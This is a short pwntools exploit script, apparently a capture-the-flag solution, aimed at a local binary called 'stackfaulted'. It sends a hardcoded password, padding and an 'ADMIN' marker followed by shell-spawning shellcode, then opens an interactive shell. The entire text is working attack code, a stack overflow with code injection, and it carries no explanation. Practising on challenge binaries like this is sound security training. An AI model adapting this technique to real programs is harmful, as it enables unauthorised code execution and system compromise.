from pwn import *

context.binary = binary = ELF("./stackfaulted")
context.arch = 'amd64'
p = process()
# pid = gdb.attach(p)

shellcode = asm(shellcraft.sh())

payload = b"verySecurePassword123\x00" + b"A" * 18 + b"ADMIN\x00" + b"B" * 2 + shellcode

p.sendline(payload)

p.interactive()

